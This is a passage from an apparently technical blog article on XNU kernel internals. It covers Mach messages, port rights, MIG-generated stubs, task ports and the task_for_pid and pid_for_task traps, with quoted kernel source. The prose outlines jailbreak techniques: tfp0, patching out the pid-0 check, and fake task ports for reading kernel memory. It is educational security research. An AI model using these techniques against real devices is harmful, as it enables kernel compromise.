    0992:  *		Send and/or receive a message.  If the message operation
    0993:  *		is interrupted, and the user did not request an indication
    0994:  *		of that fact, then restart the appropriate parts of the
    0995:  *		operation silently (trap version does not restart).
    0996:  */</span>
    <span class="mi">0997</span><span class="o">:</span> <span class="n">__WATCHOS_PROHIBITED</span> <span class="n">__TVOS_PROHIBITED</span>
    <span class="mi">0998</span><span class="o">:</span> <span class="k">extern</span> <span class="n">mach_msg_return_t</span>	<span class="nf">mach_msg</span><span class="p">(</span>
    <span class="mi">0999</span><span class="o">:</span> 					<span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span>
    <span class="mi">1000</span><span class="o">:</span> 					<span class="n">mach_msg_option_t</span> <span class="n">option</span><span class="p">,</span>
    <span class="mi">1001</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">send_size</span><span class="p">,</span>
    <span class="mi">1002</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">rcv_size</span><span class="p">,</span>
    <span class="mi">1003</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">rcv_name</span><span class="p">,</span>
    <span class="mi">1004</span><span class="o">:</span> 					<span class="n">mach_msg_timeout_t</span> <span class="n">timeout</span><span class="p">,</span>
    <span class="mi">1005</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">notify</span><span class="p">);</span>
    <span class="mi">1006</span><span class="o">:</span> </code></pre></figure>

<p>If you have a send right to a port, you can insert that send right into another task using <strong>mach_port_insert_right</strong> and then sending the message using <strong>mach_msg</strong>. As discussed before, <strong>mach_port_name_t</strong> is meanigless outside a task’s namespace, this is why the task (ipc_space_t) needs to be specified along with the <strong>mach_port_name_t</strong> so that the kernel can put the specified name (mach_port_name_t) into that task’s namespace.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     *	Inserts the specified rights into the target task,
     *	using the specified name.  If inserting send/receive
     *	rights and the task already has send/receive rights
     *	for the port, then the names must agree.In any case,
     *	the task gains a user ref for the port.
     */</span>

    <span class="cp">#ifdef	mig_external
</span>    <span class="n">mig_external</span>
    <span class="cp">#else
</span>    <span class="k">extern</span>
    <span class="cp">#endif	</span><span class="cm">/* mig_external */</span><span class="cp">
</span>    <span class="n">kern_return_t</span> <span class="nf">mach_port_insert_right</span>
    <span class="p">(</span>
    	<span class="n">ipc_space_t</span> <span class="n">task</span><span class="p">,</span>
    	<span class="n">mach_port_name_t</span> <span class="n">name</span><span class="p">,</span>
    	<span class="n">mach_port_t</span> <span class="n">poly</span><span class="p">,</span>
    	<span class="n">mach_msg_type_name_t</span> <span class="n">polyPoly</span>
    <span class="p">);</span><span class="n">z</span>

    <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_insert_right</span><span class="p">(</span><span class="n">receiver_task</span><span class="p">,</span> <span class="mh">0x1234</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span>
    <span class="n">MACH_MSG_TYPE_MOVE_SEND</span><span class="p">);</span></code></pre></figure>

<h2 id="mig---mach-interface-generator">MIG - Mach Interface Generator</h2>

<p>A lot of the code written using Mach APIs involves the same boilerplate code, doing which many times might cause complications and even lead to security flaws, and this is where the Mach Interface Generator comes in very handy. It implements a stub function based on a MIG specification file (defs). The client can call this stub function just like any other C function call, and the stub function handles marshaling and un-marshaling data in and out of the mach messages, thereby controlling all the Mach IPC implementation happening underneath.</p>

<p>MIG’s specification files have the extension <strong>defs</strong>, and when the kernel is compiled, these files get processed by mig and result in addition of extra files, which contains the autogenerated MIG wrappers. For e.g, let’s have a look at the task.defs file in <strong>osfmk/mach/task.defs</strong>. As you can see, each defs file has a subsystem name followed by an arbitrary number, which is declared at the very beginning of the file. In this case, the subsystem name is task and is the number is 3400. The stub function may also check the validity of the arguments that are passed to it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span><span class="o">/</span><span class="n">COMPILE_KERNEL</span><span class="o">/</span><span class="n">xnu</span><span class="o">-</span><span class="mi">4570</span><span class="p">.</span><span class="mi">41</span><span class="p">.</span><span class="mi">2</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">65</span><span class="o">:</span> <span class="n">subsystem</span>
    <span class="mi">66</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">KERNEL_SERVER</span>
    <span class="mi">67</span><span class="o">:</span>     <span class="n">KernelServer</span>
    <span class="mi">68</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>  <span class="cm">/* KERNEL_SERVER */</span>
    <span class="mi">69</span><span class="o">:</span>     <span class="n">task</span> <span class="mi">3400</span><span class="p">;</span>
    <span class="mi">70</span><span class="o">:</span> 
    <span class="mi">71</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mi">72</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mi">73</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mi">74</span><span class="o">:</span> 
    <span class="mi">75</span><span class="o">:</span> <span class="cm">/*
    76:  *  Create a new task with an empty set of IPC rights,
    77:  *  and having an address space constructed from the
    78:  *  target task (or empty, if inherit_memory is FALSE).
    79:  */</span>
    <span class="mi">80</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_create</span><span class="p">(</span>
    <span class="mi">81</span><span class="o">:</span>     <span class="n">target_task</span> <span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">82</span><span class="o">:</span>     <span class="n">ledgers</span>   <span class="o">:</span> <span class="n">ledger_array_t</span><span class="p">;</span>
    <span class="mi">83</span><span class="o">:</span>     <span class="n">inherit_memory</span>  <span class="o">:</span> <span class="n">boolean_t</span><span class="p">;</span>
    <span class="mi">84</span><span class="o">:</span>   <span class="n">out</span> <span class="n">child_task</span>  <span class="o">:</span> <span class="n">task_t</span><span class="p">);</span>
    <span class="mi">85</span><span class="o">:</span> 
    <span class="mi">86</span><span class="o">:</span> <span class="o">/*</span>
    <span class="mi">87</span><span class="o">:</span>  <span class="o">*</span>  <span class="n">Destroy</span> <span class="n">the</span> <span class="n">target</span> <span class="n">task</span><span class="p">,</span> <span class="n">causing</span> <span class="n">all</span> <span class="n">of</span> <span class="n">its</span> <span class="n">threads</span></code></pre></figure>

<p>If you want to generate the MIG wrappers, you can simple run mig on any def file from a clean directory.</p>

<p><img src="/images/16.png" alt="16" /></p>

<p>During compilation, the <strong>mig</strong> tool creates three files based on the subsystem name. For e.g, for the task subsystem, the following files are created</p>

<ul>
  <li><strong>taskUser.c</strong> - This file contains the implementations for the proxy functions which is responsible for marshalling the data into a message and sending it. It is also responsible for unmarshalling the returned data and getting it sent back to the client.</li>
  <li><strong>task.c</strong> - Prototype for the proxy functions</li>
  <li><strong>taskServer.c</strong> - Implementations for the stub functions are contained in this file.</li>
</ul>

<p>There are many <strong>routines</strong> defined in the generated file and these are basically the functions. Let’s look at one specific Mach API <strong>routine task_set_exception_ports</strong> and have a look at the auto-generated MIG code.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span><span class="o">/</span><span class="n">COMPILE_KERNEL</span><span class="o">/</span><span class="n">xnu</span><span class="o">-</span><span class="mi">4903</span><span class="p">.</span><span class="mi">221</span><span class="p">.</span><span class="mi">2</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1697</span><span class="o">:</span> <span class="cm">/* Routine task_set_exception_ports */</span>
    <span class="mi">1698</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xtask_set_exception_ports</span>
    <span class="mi">1699</span><span class="o">:</span>   <span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">1700</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1701</span><span class="o">:</span> 
    <span class="mi">1702</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">1703</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">1704</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">1705</span><span class="o">:</span>   <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">1706</span><span class="o">:</span>     <span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">1707</span><span class="o">:</span>     <span class="cm">/* start of the kernel processed data */</span>
    <span class="mi">1708</span><span class="o">:</span>     <span class="n">mach_msg_body_t</span> <span class="n">msgh_body</span><span class="p">;</span>
    <span class="mi">1709</span><span class="o">:</span>     <span class="n">mach_msg_port_descriptor_t</span> <span class="n">new_port</span><span class="p">;</span>
    <span class="mi">1710</span><span class="o">:</span>     <span class="cm">/* end of the kernel processed data */</span>
    <span class="mi">1711</span><span class="o">:</span>     <span class="n">NDR_record_t</span> <span class="n">NDR</span><span class="p">;</span>
    <span class="mi">1712</span><span class="o">:</span>     <span class="n">exception_mask_t</span> <span class="n">exception_mask</span><span class="p">;</span>
    <span class="mi">1713</span><span class="o">:</span>     <span class="n">exception_behavior_t</span> <span class="n">behavior</span><span class="p">;</span>
    <span class="mi">1714</span><span class="o">:</span>     <span class="n">thread_state_flavor_t</span> <span class="n">new_flavor</span><span class="p">;</span>
    <span class="mi">1715</span><span class="o">:</span>     <span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">1716</span><span class="o">:</span>   <span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">1717</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">1718</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">1719</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">1720</span><span class="o">:</span>   <span class="k">typedef</span> <span class="n">__Request__task_set_exception_ports_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">1721</span><span class="o">:</span>   <span class="k">typedef</span> <span class="n">__Reply__task_set_exception_ports_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">1722</span><span class="o">:</span> </code></pre></figure>

<p>It’s quite important to audit the code in these functions as well. In the next article, we will discuss a vulnerability identified in the autogenerated MIG code obtained after building the kernel.</p>

<h2 id="task-ports">Task Ports</h2>

<p>One of the other useful features of Mach Ports is that they serve as an abstraction over Objects, and the abstraction is provided by Mach Messages which mostly translate over MIG. For example, the Host Mach ports provide many APIs to get information about the host. The <strong>host_kernel_version()</strong> function will print out the kernel version. This is the same API used by the <strong>uname -r</strong> command. Looking at the file <strong>osfmk/mach/mach_host.defs</strong> will show all the routines provided by the host port APIs.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">mach_host</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">087</span><span class="o">:</span> <span class="cm">/*
    088:  *	Return information about this host.
    089:  */</span>
    <span class="mi">090</span><span class="o">:</span> <span class="n">routine</span> <span class="n">host_info</span><span class="p">(</span>
    <span class="mi">091</span><span class="o">:</span> 		<span class="n">host</span>		<span class="o">:</span> <span class="n">host_t</span><span class="p">;</span>
    <span class="mi">092</span><span class="o">:</span> 		<span class="n">flavor</span>		<span class="o">:</span> <span class="n">host_flavor_t</span><span class="p">;</span>
    <span class="mi">093</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">host_info_out</span>	<span class="o">:</span> <span class="n">host_info_t</span><span class="p">,</span> <span class="n">CountInOut</span><span class="p">);</span>
    <span class="mi">094</span><span class="o">:</span> 
    <span class="mi">095</span><span class="o">:</span> <span class="cm">/*
    096:  *	Get string describing current kernel version.
    097:  */</span>
    <span class="mi">098</span><span class="o">:</span> <span class="n">routine</span>	<span class="n">host_kernel_version</span><span class="p">(</span>
    <span class="mi">099</span><span class="o">:</span> 		<span class="n">host</span>		<span class="o">:</span> <span class="n">host_t</span><span class="p">;</span>
    <span class="mi">100</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">kernel_version</span>	<span class="o">:</span> <span class="n">kernel_version_t</span><span class="p">);</span>
    <span class="mi">101</span><span class="o">:</span> 
    <span class="mi">102</span><span class="o">:</span> <span class="cm">/*
    103:  *      Get host page size
    104:  *	(compatibility for running old libraries on new kernels -
    105:  *	host_page_size() is now a library routine based on constants)
    106:  */</span>
    <span class="mi">107</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">KERNEL</span>
    <span class="mi">108</span><span class="o">:</span> <span class="n">routine</span> <span class="n">host_page_size</span><span class="p">(</span>
    <span class="mi">109</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">110</span><span class="o">:</span> <span class="n">routine</span> <span class="n">_host_page_size</span><span class="p">(</span>
    <span class="mi">111</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">112</span><span class="o">:</span> 		<span class="n">host</span>		<span class="o">:</span> <span class="n">host_t</span><span class="p">;</span>
    <span class="mi">113</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">out_page_size</span>	<span class="o">:</span> <span class="n">vm_size_t</span><span class="p">);</span>
    <span class="mi">114</span><span class="o">:</span> </code></pre></figure>

<p>Similarly, the task ports serve as an abstraction over the task. The APIs can be found under <strong>osfmk/mach/task.defs</strong> or <strong>osfmk/mach/task.defs</strong> in the <strong>BUILD</strong> folder in the kernel.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">409</span><span class="o">:</span> <span class="cm">/*
    410:  * Read the selected state which is to be installed on new 
    411:  * threads in the task as they are created.
    412:  */</span>
    <span class="mi">413</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_get_state</span><span class="p">(</span>
    <span class="mi">414</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">415</span><span class="o">:</span> 		<span class="n">flavor</span>		<span class="o">:</span> <span class="n">thread_state_flavor_t</span><span class="p">;</span>
    <span class="mi">416</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">old_state</span>	<span class="o">:</span> <span class="n">thread_state_t</span><span class="p">,</span> <span class="n">CountInOut</span><span class="p">);</span>
    <span class="mi">417</span><span class="o">:</span>  
    <span class="mi">418</span><span class="o">:</span> <span class="cm">/*
    419:  * Set the selected state information to be installed on
    420:  * all subsequently created threads in the task.
    421:  */</span>
    <span class="mi">422</span><span class="o">:</span> <span class="n">routine</span>	<span class="n">task_set_state</span><span class="p">(</span>
    <span class="mi">423</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">424</span><span class="o">:</span> 		<span class="n">flavor</span>		<span class="o">:</span> <span class="n">thread_state_flavor_t</span><span class="p">;</span>
    <span class="mi">425</span><span class="o">:</span> 		<span class="n">new_state</span>	<span class="o">:</span> <span class="n">thread_state_t</span><span class="p">);</span>
    <span class="mi">426</span><span class="o">:</span> 
    <span class="mi">427</span><span class="o">:</span> <span class="cm">/*
    428:  * Change the task's physical footprint limit (in MB).
    429:  */</span>
    <span class="mi">430</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_set_phys_footprint_limit</span><span class="p">(</span>
    <span class="mi">431</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">432</span><span class="o">:</span> 		<span class="n">new_limit</span>	<span class="o">:</span> <span class="kt">int</span><span class="p">;</span>
    <span class="mi">433</span><span class="o">:</span> 	<span class="n">out</span> <span class="n">old_limit</span>	<span class="o">:</span> <span class="kt">int</span><span class="p">);</span>
    <span class="mi">434</span><span class="o">:</span> 
    <span class="mi">435</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_suspend2</span><span class="p">(</span>
    <span class="mi">436</span><span class="o">:</span> 		<span class="n">target_task</span> <span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">437</span><span class="o">:</span> 	<span class="n">out</span> <span class="n">suspend_token</span> <span class="o">:</span> <span class="n">task_suspension_token_t</span><span class="p">);</span>
    <span class="mi">438</span><span class="o">:</span> 
    <span class="mi">439</span><span class="o">:</span> <span class="n">routine</span> <span class="nf">task_resume2</span><span class="p">(</span>
    <span class="mi">440</span><span class="o">:</span> 		<span class="n">suspend_token</span> <span class="o">:</span> <span class="n">task_suspension_token_t</span><span class="p">);</span>
    <span class="mi">441</span><span class="o">:</span> </code></pre></figure>

<p>These APIs are quite powerful and allow full interaction with the target task. Having a send right to the task port of a process will give full control over that task, which includes reading, writing and allocating of memory in the target tasks memory region. Btw, we are mentioning Task (coming from Mach) ports of a process (coming from BSD), this might seem wierd and it is important to note that while these are 2 different flavours of Mach, they are internally linked. Every associated BSD process has a corresponding Mach task and vice versa. The task struct can be found under <strong>osfmk/kern/task.h</strong> , this has a <strong>bsd_info</strong> field which is a pointer to the <strong>proc</strong> structure in <strong>bsd/sys/proc_internal.h</strong>. Similarly, the task field in the proc structure is a pointer to the task structure of that process.</p>

<p><img src="/images/21.png" alt="21" /></p>

<p>Using the Mach Trap <strong>task_for_pid</strong>, it is possible to get a send right to the task port corresponding to the target PID to the caller. As can be seen from the comments below in the implementation in the file <strong>bsd/vm/vm_unix.c</strong>, it is only permitted to privileged processes or processes with the same user ID. Apart from being privileged, calling this API also requires certain entitlements (<strong>get-task-allow</strong> and <strong>task_for_pid-allow</strong>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_unix</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">749</span><span class="o">:</span> <span class="cm">/*
    750:  *	Routine:	task_for_pid
    751:  *	Purpose:
    752:  *		Get the task port for another "process", named by its
    753:  *		process ID on the same host as "target_task".
    754:  *
    755:  *		Only permitted to privileged processes, or processes
    756:  *		with the same user ID.
    757:  *
    758:  *		Note: if pid == 0, an error is return no matter who is calling.
    759:  *
    760:  * XXX This should be a BSD system call, not a Mach trap!!!
    761:  */</span>
    <span class="mi">762</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">763</span><span class="o">:</span> <span class="n">task_for_pid</span><span class="p">(</span>
    <span class="mi">764</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">task_for_pid_args</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
    <span class="mi">765</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">766</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>	<span class="n">target_tport</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">target_tport</span><span class="p">;</span>
    <span class="mi">767</span><span class="o">:</span> 	<span class="kt">int</span>			<span class="n">pid</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>
    <span class="mi">768</span><span class="o">:</span> 	<span class="n">user_addr_t</span>		<span class="n">task_addr</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">t</span><span class="p">;</span>
    <span class="mi">769</span><span class="o">:</span> 	<span class="n">proc_t</span> 			<span class="n">p</span> <span class="o">=</span> <span class="n">PROC_NULL</span><span class="p">;</span>
    <span class="mi">770</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">t1</span> <span class="o">=</span> <span class="n">TASK_NULL</span><span class="p">;</span>
    <span class="mi">771</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>	<span class="n">tret</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="mi">772</span><span class="o">:</span>  	<span class="n">ipc_port_t</span> 		<span class="n">tfpport</span><span class="p">;</span>
    <span class="mi">773</span><span class="o">:</span> 	<span class="kt">void</span> <span class="o">*</span> <span class="n">sright</span><span class="p">;</span>
    <span class="mi">774</span><span class="o">:</span> 	<span class="kt">int</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">775</span><span class="o">:</span> 
    <span class="mi">776</span><span class="o">:</span> 	<span class="n">AUDIT_MACH_SYSCALL_ENTER</span><span class="p">(</span><span class="n">AUE_TASKFORPID</span><span class="p">);</span>
    <span class="mi">777</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="mi">778</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">mach_port1</span><span class="p">,</span> <span class="n">target_tport</span><span class="p">);</span>
    <span class="mi">779</span><span class="o">:</span> 
    <span class="mi">780</span><span class="o">:</span> 	<span class="cm">/* Always check if pid == 0 */</span>
    <span class="mi">781</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">782</span><span class="o">:</span> 		<span class="p">(</span><span class="kt">void</span> <span class="p">)</span> <span class="n">copyout</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span> <span class="n">task_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_name_t</span><span class="p">));</span>
    <span class="mi">783</span><span class="o">:</span> 		<span class="n">AUDIT_MACH_SYSCALL_EXIT</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">784</span><span class="o">:</span> 		<span class="k">return</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">785</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">786</span><span class="o">:</span> 
    <span class="mi">787</span><span class="o">:</span> 	<span class="n">t1</span> <span class="o">=</span> <span class="n">port_name_to_task</span><span class="p">(</span><span class="n">target_tport</span><span class="p">);</span>
    <span class="mi">788</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">t1</span> <span class="o">==</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">789</span><span class="o">:</span> 		<span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">copyout</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span> <span class="n">task_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_name_t</span><span class="p">));</span>
    <span class="mi">790</span><span class="o">:</span> 		<span class="n">AUDIT_MACH_SYSCALL_EXIT</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">791</span><span class="o">:</span> 		<span class="k">return</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">792</span><span class="o">:</span> 	<span class="p">}</span> 
    <span class="mi">793</span><span class="o">:</span> 
    <span class="mi">794</span><span class="o">:</span> 
    <span class="mi">795</span><span class="o">:</span> 	<span class="n">p</span> <span class="o">=</span> <span class="n">proc_find</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
    <span class="mi">796</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">PROC_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">797</span><span class="o">:</span> 		<span class="n">error</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">798</span><span class="o">:</span> 		<span class="k">goto</span> <span class="n">tfpout</span><span class="p">;</span>
    <span class="mi">799</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">800</span><span class="o">:</span> 
    <span class="mi">801</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">CONFIG_AUDIT</span>
    <span class="mi">802</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
    <span class="mi">803</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">804</span><span class="o">:</span> 
    <span class="mi">805</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">task_for_pid_posix_check</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span> <span class="p">{</span>
    <span class="mi">806</span><span class="o">:</span> 		<span class="n">error</span> <span class="o">=</span> <span class="n">KERN_FAILURE</span><span class="p">;</span>
    <span class="mi">807</span><span class="o">:</span> 		<span class="k">goto</span> <span class="n">tfpout</span><span class="p">;</span>
    <span class="mi">808</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">809</span><span class="o">:</span> 
    <span class="mi">810</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">task</span> <span class="o">!=</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">811</span><span class="o">:</span> 		<span class="cm">/* If we aren't root and target's task access port is set... */</span>
    <span class="mi">812</span><span class="o">:</span> 		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">kauth_cred_issuser</span><span class="p">(</span><span class="n">kauth_cred_get</span><span class="p">())</span> <span class="o">&amp;&amp;</span>
    <span class="mi">813</span><span class="o">:</span> 			<span class="n">p</span> <span class="o">!=</span> <span class="n">current_proc</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
    <span class="mi">814</span><span class="o">:</span> 			<span class="p">(</span><span class="n">task_get_task_access_port</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tfpport</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
    <span class="mi">815</span><span class="o">:</span> 			<span class="p">(</span><span class="n">tfpport</span> <span class="o">!=</span> <span class="n">IPC_PORT_NULL</span><span class="p">))</span> <span class="p">{</span>
    <span class="mi">816</span><span class="o">:</span> 
    <span class="mi">817</span><span class="o">:</span> 			<span class="k">if</span> <span class="p">(</span><span class="n">tfpport</span> <span class="o">==</span> <span class="n">IPC_PORT_DEAD</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">818</span><span class="o">:</span> 				<span class="n">error</span> <span class="o">=</span> <span class="n">KERN_PROTECTION_FAILURE</span><span class="p">;</span>
    <span class="mi">819</span><span class="o">:</span> 				<span class="k">goto</span> <span class="n">tfpout</span><span class="p">;</span></code></pre></figure>

<p>Another thing you will notice here is the check for <strong>pid=0</strong>. This is done to prevent user specified process from accessing the send right to the kernel task port (tfp0) by specifying the pid 0. Previously, once kernel r/w was obtained, the jailbreaks used to kill this check and call <strong>task_for_pid(0)</strong>. However, with the advent of <strong>KPP</strong> and <strong>AMCC/KTRR</strong>, patching wasn’t possible anymore, and hence other techniques were used but the name <strong>tfp0</strong> still stuck and is still used to signify read and write access to kernel memory.</p>

<p>The other API very commonly used is the <strong>pid_for_task()</strong> Mach Trap, which is used to find the pid for the process corresponding to a given Mach Task. What it basically does is looks up the <strong>task</strong> struct, looks up the <strong>bsd_info</strong> field which points to the corresponding BSD <strong>proc</strong> struct in the kernel, and reads the <strong>p_pid</strong> value from the <strong>proc</strong> struct. This technique has been widely used to read arbitrary kernel memory four bytes at a time (since the <strong>pid</strong> field is 32 bits) by creating a fake task port, which is discussed later in this article.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_unix</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">612</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">613</span><span class="o">:</span> <span class="n">pid_for_task</span><span class="p">(</span>
    <span class="mi">614</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">pid_for_task_args</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
    <span class="mi">615</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">616</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>	<span class="n">t</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">t</span><span class="p">;</span>
